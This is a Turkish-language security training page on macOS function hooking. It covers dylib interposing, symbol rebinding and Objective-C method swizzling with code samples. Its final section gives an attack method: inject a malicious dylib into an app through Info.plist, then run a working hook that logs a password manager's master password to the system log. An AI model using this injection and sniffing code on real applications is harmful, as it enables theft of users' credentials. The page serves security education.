# macOS Function Hooking

{{#include ../../../banners/hacktricks-training.md}}

## Function Interposing

Bir **dylib** oluşturun; içinde **`__interpose` (`__DATA___interpose`)** bölümü (veya **`S_INTERPOSING`** ile işaretlenmiş bir bölüm) olsun ve **orijinal** ve **replacement** fonksiyonlara referans veren **function pointers** çiftlerini içersin.

Ardından, dylib'i **`DYLD_INSERT_LIBRARIES`** ile **inject** edin (interposing işlemi ana app yüklenmeden önce gerçekleşmelidir). Açıkça, **`DYLD_INSERT_LIBRARIES`** kullanımına uygulanan [**restrictions**](macos-library-injection/index.html#check-restrictions) burada da geçerlidir.

### Interpose printf

{{#tabs}}
{{#tab name="interpose.c"}}
```c:interpose.c" overflow="wrap
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
//va_list args;
//va_start(args, format);
//int ret = vprintf(format, args);
//va_end(args);

int ret = printf("Hello from interpose\n");
return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```
{{#endtab}}

{{#tab name="hello.c"}}
```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
printf("Hello World!\n");
return 0;
}
```
{{#endtab}}

{{#tab name="interpose2.c"}}
```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
__attribute__((used)) static struct { \
const void* replacement; \
const void* replacee; \
} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
(const void*) (unsigned long) &_replacement, \
(const void*) (unsigned long) &_replacee \
};

int my_printf(const char *format, ...)
{
int ret = printf("Hello from interpose\n");
return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```
{{#endtab}}
{{#endtabs}}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```
> [!WARNING]
> **`DYLD_PRINT_INTERPOSING`** env variable'ı interposing'i debug etmek için kullanılabilir ve interpose sürecini yazdırır.

Ayrıca şunu da not edin: **interposing process ile loaded libraries arasında gerçekleşir**, shared library cache ile çalışmaz.

### Dynamic Interposing

Artık **`dyld_dynamic_interpose`** fonksiyonunu kullanarak bir fonksiyonu dinamik olarak interpose etmek de mümkündür. Bu, bir fonksiyonu yalnızca **başlangıçtan** yapmak yerine **runtime** sırasında **programmatically** interpose etmeyi sağlar.

Sadece **değiştirilecek fonksiyon** ile **replacement** fonksiyonunun **tuples**'ını belirtmek gerekir.
```c
struct dyld_interpose_tuple {
const void* replacement;
const void* replacee;
};
extern void dyld_dynamic_interpose(const struct mach_header* mh,
const struct dyld_interpose_tuple array[], size_t count);
```
### Import Table Rebinding (fishhook-style)

Zaten **process içinde** code execution elde ettiysen ve target’ı yeniden başlatmadan **import edilmiş bir C function** hook etmek istiyorsan, çok yaygın bir primitive **symbol rebinding**’dir (**`fishhook`** ile popülerleşmiştir).

**`__interpose`** section’ını kullanmak yerine, bu technique Mach-O metadata’yı (`__LINKEDIT` -> indirect symbol table -> `__la_symbol_ptr` / `__nl_symbol_ptr`) dolaşır ve current image tarafından kullanılan **import slot**’unu **overwrite** eder. Bu, **zaten çalışan** bir process içinde function hook etmek veya **`rebind_symbols_image`** ile **sadece bir image** hook etmek için çok kullanışlıdır.

> [!TIP]
> Bu sadece gerçekten bir **import pointer** üzerinden geçen calls’ları etkiler. Eğer target function **aynı image içinde doğrudan çağrılıyorsa**, rewrite edilecek imported slot yoktur; dolayısıyla bu technique o call site’ı görmez.
```c
// clang -dynamiclib fishhook_demo.c fishhook.c -o fishhook_demo.dylib
#include <stdio.h>
#include <unistd.h>
#include "fishhook.h"

static int (*real_close)(int);

int hooked_close(int fd) {
fprintf(stderr, "[+] close(%d)\n", fd);
return real_close(fd);
}

__attribute__((constructor))
static void install(void) {
struct rebinding rb = {"close", hooked_close, (void *)&real_close};
rebind_symbols(&rb, 1);
}
```

```bash
DYLD_INSERT_LIBRARIES=./fishhook_demo.dylib ./hello
```
Son macOS sürümlerinde birçok rebinding hedefi artık yazılabilir **`__DATA`** sayfalarında değil. Rebinder’ların genellikle pointer’ı patch’lemeden önce **`__DATA_CONST`** bölümünü geçici olarak yazılabilir hale getirmesi gerekir. Ayrıca, Apple Silicon / **`arm64e`** üzerinde authenticated pointer’lar ve **`__AUTH_CONST.__auth_got`** içinde ekstra indirection beklemelisiniz; bu yüzden yalnızca klasik lazy/non-lazy symbol pointer section’larını tarayan bir rebinder bazı call site’ları kaçırabilir.

> [!CAUTION]
> **`arm64e`** ABI, birçok function pointer için **Pointer Authentication (PAC)** kullanır. Intel’de çalışan kör pointer yazmaları Apple Silicon üzerinde bir call site’ı bozabilir. Kendi rebinder’ınızı veya inline hooker’ınızı yazarken, **`<ptrauth.h>`** yardımcılarını, örneğin **`ptrauth_sign_unauthenticated`** veya **`ptrauth_auth_and_resign`** kullanmaya hazır olun ve özellikle **`arm64e`** target’larda test edin.

**`__AUTH`**, **`__AUTH_CONST`** ve **`__auth_got`** hakkında daha fazla detay için [bu sayfaya](../macos-apps-inspecting-debugging-and-fuzzing/objects-in-memory.md) bakın.

## Method Swizzling

ObjectiveC’de bir method şu şekilde çağrılır: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**

Gerekli olan **object**, **method** ve **params**’tir. Bir method çağrıldığında **`objc_msgSend`** function’ı kullanılarak bir **msg gönderilir**: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`

Object **`someObject`**, method **`@selector(method1p1:p2:)`** ve arguments ise **value1**, **value2**’dir.

Object structure’larını takip ederek, **names** ve method code’una ait **pointers**’ın **bulunduğu** bir **method array**’ine ulaşmak mümkündür.

> [!CAUTION]
> Method’lar ve class’lar isimlerine göre erişildiği için bu bilgi binary içinde saklanır; dolayısıyla `otool -ov </path/bin>` veya [`class-dump </path/bin>`](https://github.com/nygard/class-dump) ile bunu elde etmek mümkündür

### Raw method’lara erişim

Aşağıdaki örnekteki gibi name, parametre sayısı veya address gibi method bilgilerine erişmek mümkündür:
```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
// Get class of the variable
NSString* str = @"This is an example";
Class strClass = [str class];
NSLog(@"str's Class name: %s", class_getName(strClass));

// Get parent class of a class
Class strSuper = class_getSuperclass(strClass);
NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

// Get information about a method
SEL sel = @selector(length);
NSLog(@"Selector name: %@", NSStringFromSelector(sel));
Method m = class_getInstanceMethod(strClass,sel);
NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

// Iterate through the class hierarchy
NSLog(@"Listing methods:");
Class currentClass = strClass;
while (currentClass != NULL) {
unsigned int inheritedMethodCount = 0;
Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);

NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);

for (unsigned int i = 0; i < inheritedMethodCount; i++) {
Method method = inheritedMethods[i];
SEL selector = method_getName(method);
const char* methodName = sel_getName(selector);
unsigned long address = (unsigned long)method_getImplementation(m);
NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
}

// Free the memory allocated by class_copyMethodList
free(inheritedMethods);
currentClass = class_getSuperclass(currentClass);
}

// Other ways to call uppercaseString method
if([str respondsToSelector:@selector(uppercaseString)]) {
NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
NSLog(@"Uppercase string: %@", uppercaseString);
}

// Using objc_msgSend directly
NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
NSLog(@"Uppercase string: %@", uppercaseString2);

// Calling the address directly
IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
NSLog(@"Uppercase string: %@", uppercaseString3);

return 0;
}
```
### method_exchangeImplementations ile Method Swizzling

**`method_exchangeImplementations`** fonksiyonu, **bir fonksiyonun implementation** **adresini** **diğerinin yerine değiştirmeye** izin verir.

> [!CAUTION]
> Yani bir fonksiyon çağrıldığında **çalıştırılan şey diğeridir**.
```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original method
return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
// Perform method swizzling
Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
method_exchangeImplementations(originalMethod, swizzledMethod);

// We changed the address of one method for the other
// Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
// And when swizzledSubstringFromIndex is called, substringFromIndex is really called

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

return 0;
}
```
> [!WARNING]
> Bu durumda, **meşru** method’un **uygulama code’u** **method** **adını** **doğrularsa** bu swizzling’i **tespit** edebilir ve çalışmasını engelleyebilir.
>
> Aşağıdaki technique bu kısıtlamaya sahip değildir.

### `method_setImplementation` ile Method Swizzling

Önceki format gariptir çünkü 2 method’un implementation’ını birbirinin yerine değiştiriyorsunuz. **`method_setImplementation`** fonksiyonunu kullanarak bir **method’un implementation’ını diğerininkiyle** **değiştirebilirsiniz**.

Yeni implementation’dan çağıracaksanız, **orijinal olanın implementation adresini kaydetmeyi** unutmayın; çünkü daha sonra o adresi bulmak çok daha zor olacaktır.
```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original implementation using objc_msgSendSuper
return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Get the class of the target method
Class stringClass = [NSString class];

// Get the swizzled and original methods
Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));

// Get the function pointer to the swizzled method's implementation
IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));

// Swap the implementations
// It return the now overwritten implementation of the original method to store it
original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

// Set the original implementation back
method_setImplementation(originalMethod, original_substringFromIndex);

return 0;
}
}
```
## Hooking Attack Methodology

Bu sayfada fonksiyonları hook etmenin farklı yolları tartışıldı. Ancak bunlar **saldırmak için process içinde code çalıştırmayı** içeriyordu.

Bunu yapmak için kullanılması en kolay teknik, bir [Dyld via environment variables or hijacking](macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) inject etmektir. Ancak bunun [Dylib process injection](macos-ipc-inter-process-communication/index.html#dylib-process-injection-via-task-port) üzerinden de yapılabileceğini tahmin ediyorum.

Ancak her iki seçenek de yalnızca **unprotected** binary/process'lerle **sınırlıdır**. Sınırlamaları daha iyi anlamak için her tekniği kontrol edin.

Bununla birlikte, bir function hooking attack çok özeldir; bir saldırgan bunu bir process içinden **hassas bilgileri çalmak** için yapar (aksi halde sadece bir process injection attack yaparsınız). Ve bu hassas bilgi, MacPass gibi kullanıcı tarafından indirilmiş Apps içinde bulunabilir.

Dolayısıyla saldırı vektörü, ya bir vulnerability bulmak ya da application'ın signature'ını kaldırmak, ardından uygulamanın Info.plist'i üzerinden **`DYLD_INSERT_LIBRARIES`** env variable'ını şu tarz bir şey ekleyerek inject etmek olur:
```xml
<key>LSEnvironment</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```
ve ardından uygulamayı **yeniden kaydet**:
```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```
O kütüphaneye bilgileri sızdırmak için hooking kodunu ekleyin: Parolalar, mesajlar...

> [!CAUTION]
> macOS’un daha yeni sürümlerinde, uygulama binary’sinin **imzasını kaldırırsanız** ve daha önce çalıştırıldıysa, macOS **artık uygulamayı çalıştırmayacaktır**.

#### Library example
```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
// Function that will log the password and call the original setPassword(pass, file_path) method
NSLog(@"[+] Password is: %@", password);

// After logging the password call the original method so nothing breaks.
return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
// Get the real method address to not lose it
Class classMPDocument = NSClassFromString(@"MPDocument");
Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));

// Make the original method setPassword call the fake implementation one
IMP fake_IMP = (IMP)custom_setPassword;
real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```
## Referanslar

- [https://nshipster.com/method-swizzling/](https://nshipster.com/method-swizzling/)
- [https://github.com/facebook/fishhook](https://github.com/facebook/fishhook)
- [https://clang.llvm.org/docs/PointerAuthentication.html](https://clang.llvm.org/docs/PointerAuthentication.html)

{{#include ../../../banners/hacktricks-training.md}}
